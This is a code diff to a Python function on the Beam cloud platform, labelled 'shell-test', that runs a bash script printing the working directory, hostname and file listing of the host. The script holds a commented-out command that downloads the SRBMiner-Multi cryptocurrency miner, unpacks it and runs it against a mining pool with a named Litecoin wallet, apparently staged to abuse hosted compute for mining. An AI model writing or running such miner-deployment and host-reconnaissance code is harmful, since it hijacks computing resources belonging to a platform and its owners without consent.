@@ -1,27 +1,32 @@
 from beam import function
-from pathlib import Path
-import os
+import subprocess
 
 @function(name="shell-test")
 def momo():
-    print("=== BEAM DEBUG ===")
-    print("cwd:", os.getcwd())
-    print("mui.py:", __file__)
+    result = subprocess.run(
+        ["bash", "-lc", """
+            echo "=== MULAI ==="
+            pwd
+            hostname
+            ls -la
 
-    base = Path(__file__).parent
-    print("base:", base)
+            # =========================
+            # wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.8/SRBMiner-Multi-2-4-8-Linux.tar.gz && tar -xzvf SRBMiner-Multi-2-4-8-Linux.tar.gz && cd SRBMiner-Multi-2-4-8 && ./SRBMiner-MULTI --algorithm randomx --pool stratum+tcp://rx.unmineable.com:3333 --wallet LTC:ltc1qwae89dljtedxyvgrgl5ug8rk7xeqaruh5utxrg."test$RANDOM"
+            # =========================
 
-    print("files:")
-    for p in base.iterdir():
-        print(" -", p)
+            echo "=== SELESAI ==="
+        """],
+        capture_output=True,
+        text=True,
+        check=True,
+    )
 
-    script = base / "script.sh"
-    print("script path:", script)
-    print("script exists:", script.exists())
+    print(result.stdout)
 
-    if not script.exists():
-        raise FileNotFoundError(
-            f"script.sh tidak ditemukan. Dicari di: {script}"
-        )
+    if result.stderr:
+        print(result.stderr)
 
-    return "script.sh ditemukan"
+    return {
+        "status": "success",
+        "output": result.stdout,
+    }
